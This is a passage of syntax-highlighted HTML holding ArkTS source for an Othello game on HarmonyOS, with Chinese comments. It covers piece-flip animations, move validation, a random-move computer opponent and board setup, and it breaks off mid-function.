class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// 导入用于弹出对话框的工具</span></span><br><span class="line"> </span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChessCell</span> &#123; <span class="comment">// 定义棋盘上的单元格类</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">frontVisibility</span>: number = <span class="number">0</span>; <span class="comment">// 单元格上的棋子状态：0表示无子, 1表示黑子，2表示白子</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span>; <span class="comment">// 单元格卡片的旋转角度</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">opacity</span>: number = <span class="number">1</span>; <span class="comment">// 透明度</span></span><br><span class="line">  <span class="attr">isAnimationRunning</span>: boolean = <span class="literal">false</span>; <span class="comment">// 标记动画是否正在运行</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">flip</span>(<span class="params">time: number</span>) &#123; <span class="comment">// 翻转棋子的方法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">frontVisibility</span> === <span class="number">1</span>) &#123; <span class="comment">// 当前是黑子，要翻转成白子</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showWhite</span>(time);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">frontVisibility</span> === <span class="number">2</span>) &#123; <span class="comment">// 当前是白子，要翻转成黑子</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showBlack</span>(time);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">showBlack</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123; <span class="comment">// 展示黑色棋子</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// 如果已经有动画在运行，则返回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// 设置动画状态为运行中</span></span><br><span class="line">    <span class="keyword">if</span> (animationTime == <span class="number">0</span>) &#123; <span class="comment">// 如果不需要动画</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">0</span>; <span class="comment">// 设置旋转角度为0</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">1</span>; <span class="comment">// 黑子</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">      <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="comment">// 开始动画</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="comment">// 再次开始动画</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">1</span>; <span class="comment">// 看到黑色</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">0</span>; <span class="comment">// 设置旋转角度为0</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// 设置旋转角度为90度</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">showWhite</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123; <span class="comment">// 展示白色棋子</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// 如果已经有动画在运行，则返回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// 设置动画状态为运行中</span></span><br><span class="line">    <span class="keyword">if</span> (animationTime == <span class="number">0</span>) &#123; <span class="comment">// 如果不需要动画</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// 设置旋转角度为180度</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// 白子</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">      <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="comment">// 开始动画</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="comment">// 再次开始动画</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line"> </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// 看到白色</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// 设置旋转角度为180度</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画开始时的回调</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// 设置旋转角度为90度</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">showWhiteAi</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123; <span class="comment">// 展示白色棋子</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// 如果已经有动画在运行，则返回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// 设置动画状态为运行中</span></span><br><span class="line">    <span class="keyword">if</span> (animationTime == <span class="number">0</span>) &#123; <span class="comment">// 如果不需要动画</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// 设置旋转角度为180度</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// 白子</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">      <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// 设置旋转角度为180度</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// 白子</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="comment">// 开始动画</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime * <span class="number">3</span>, <span class="comment">// 动画持续时间</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseOut</span>,</span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">3</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="comment">// 再次开始动画</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// 动画持续时间</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// 动画迭代次数</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// 动画曲线类型</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 动画完成后的回调</span></span><br><span class="line"> </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// 设置动画状态为停止</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// 如果有回调函数，则执行</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">0.2</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TileHighlight</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isValidMove</span>: boolean = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">OthelloGame</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">chessBoard</span>: <span class="title class_">ChessCell</span>[][] = [];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">70</span>;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSpacing</span>: number = <span class="number">5</span>;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">transitionDuration</span>: number = <span class="number">200</span>;</span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;currentPlayerIsBlackChanged&#x27;</span>) <span class="attr">currentPlayerIsBlack</span>: boolean = <span class="literal">true</span>; <span class="comment">// 先手，true表示黑棋</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">chessBoardSize</span>: number = <span class="number">8</span>; <span class="comment">// 假设棋盘大小为8×8</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">validMoveIndicators</span>: <span class="title class_">TileHighlight</span> [][] = []</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isTwoPlayerMode</span>: boolean = <span class="literal">false</span>; <span class="comment">//true:双击游戏，false:单人游戏</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isAIPlaying</span>:boolean = <span class="literal">false</span><span class="comment">//true:AI正在下棋</span></span><br><span class="line">  <span class="title function_">currentPlayerIsBlackChanged</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> color = <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="number">1</span> : <span class="number">2</span>; <span class="comment">// 1是黑子，2表示白子</span></span><br><span class="line">      <span class="keyword">let</span> hasMoves = <span class="variable language_">this</span>.<span class="title function_">hasValidMoves</span>(color);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (!hasMoves) &#123;</span><br><span class="line">        <span class="keyword">let</span> opponentHasMoves = <span class="variable language_">this</span>.<span class="title function_">hasValidMoves</span>(!<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!opponentHasMoves) &#123;</span><br><span class="line">          <span class="keyword">const</span> winner = <span class="variable language_">this</span>.<span class="title function_">determineWinner</span>();</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(winner);</span><br><span class="line">          promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;游戏结束&#x27;</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;winner&#125;</span>`</span>,</span><br><span class="line">            <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;]</span><br><span class="line">          &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">initGame</span>();</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = !<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span>; <span class="comment">// 切换下一玩家</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span>) &#123; <span class="comment">// 当前是白棋, 模拟AI下棋</span></span><br><span class="line">          <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span>) &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">aiPlaceRandom</span>();</span><br><span class="line">            &#125;, <span class="variable language_">this</span>.<span class="property">transitionDuration</span> + <span class="number">20</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="variable language_">this</span>.<span class="property">transitionDuration</span> + <span class="number">20</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">aiPlaceRandom</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">validMoves</span>: [number, number][] = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[i][j].<span class="property">isValidMove</span>) &#123;</span><br><span class="line">          validMoves.<span class="title function_">push</span>([i, j]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (validMoves.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> randomMove = validMoves[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * validMoves.<span class="property">length</span>)];</span><br><span class="line">      <span class="keyword">let</span> chessCell = <span class="variable language_">this</span>.<span class="property">chessBoard</span>[randomMove[<span class="number">0</span>]][randomMove[<span class="number">1</span>]];</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">placeChessPiece</span>(randomMove[<span class="number">0</span>], randomMove[<span class="number">1</span>], chessCell)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">placeChessPiece</span>(<span class="params">i: number, j: number, chessCell: ChessCell</span>) &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> reversibleTiles = <span class="variable language_">this</span>.<span class="title function_">findReversible</span>(i, j, <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> ? <span class="number">1</span> : <span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`reversibleTiles:<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(reversibleTiles)&#125;</span>`</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (reversibleTiles.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = <span class="literal">false</span>;</span><br><span class="line">        chessCell.<span class="title function_">showBlack</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; reversibleTiles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">          reversibleTiles[i].<span class="title function_">flip</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isTwoPlayerMode</span>) &#123; <span class="comment">//双人游戏，无动画</span></span><br><span class="line">          chessCell.<span class="title function_">showWhite</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; reversibleTiles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            reversibleTiles[i].<span class="title function_">flip</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>);</span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">//单人游戏，落子需要闪烁动画</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isAIPlaying</span> = <span class="literal">true</span><span class="comment">//AI 正在下棋</span></span><br><span class="line">          chessCell.<span class="title function_">showWhiteAi</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; reversibleTiles.<span class="property">length</span>; i++) &#123;</span><br><span class="line">              reversibleTiles[i].<span class="title function_">flip</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">currentPlayerIsBlackChanged</span>()</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAIPlaying</span> = <span class="literal">false</span><span class="comment">//AI下完了</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">hasValidMoves</span>(<span class="params">color: number</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> hasMoves = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">chessBoard</span>[row][col].<span class="property">frontVisibility</span> === <span class="number">0</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">findReversible</span>(row, col, color).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[row][col].<span class="property">isValidMove</span> = <span class="literal">true</span>;</span><br><span class="line">          hasMoves = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[row][col].<span class="property">isValidMove</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hasMoves;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">chessBoard</span>.<span class="title function_">push</span>([]);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>.<span class="title function_">push</span>([])</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">chessBoard</span>[i].<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">ChessCell</span>());</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">validMoveIndicators</span>[i].<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">TileHighlight</span>())</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initGame</span>()</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">initGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentPlayerIsBlack</span> = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">chessBoardSize</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">chessBoard</span>[i][j].<span class="property">frontVisibility</span> = <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始棋盘布局</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">3</span>][<span class="number">3</span>].<span class="property">frontVisibility</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">3</span>][<span class="number">4</span>].<span class="property">frontVisibility</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">4</span>][<span class="number">3</span>].<span class="property">frontVisibility</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">chessBoard</span>[<span class="number">4</span>][<span class="number">4</span>].<span class="property">frontVisibility</span> = <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">currentPlayerIsBlackChanged</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">findReversible</span>(<span class="attr">row</span>: number, <span class="attr">col</span>: number, <span class="attr">color</span>: number): <span class="title class_">ChessCell</span>[] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">reversibleTiles</span>: <span class="title class_">ChessCell</span>[] = [];</span><br><span class="line">    <span class="keyword">const</span> directions = [</span><br><span class="line">      [-<span class="number">1</span>, -<span class="number">1</span>], <span class="comment">// 左上</span></span><br><span class="line">      [-<span class="number">1</span>, <span class="number">0</span>], <span class="comment">// 正上</span></span><br><span class="line">      [-<span class="number">1</span>, <span class="number">1</span>], <span class="comment">// 右上</span></span><br><span class="line">      [<span class="number">0</span>, -<span class="number">1</span>], <span class="comment">// 左</span></span><br><span class="line">      [<span class="number">0</span>, <span class="number">1</span>], <span class="comment">// 右</span></span><br><span class="line">      [<span class="number">1</span>, -<span class="number">1</span>], <span class="comment">// 左下</span></span><br><span class="line">      [<span class="number">1</span>, <span class="number">0</span>], <span class="comment">// 正下</span></span><br><span class="line">      [<span class="number">1</span>, <span 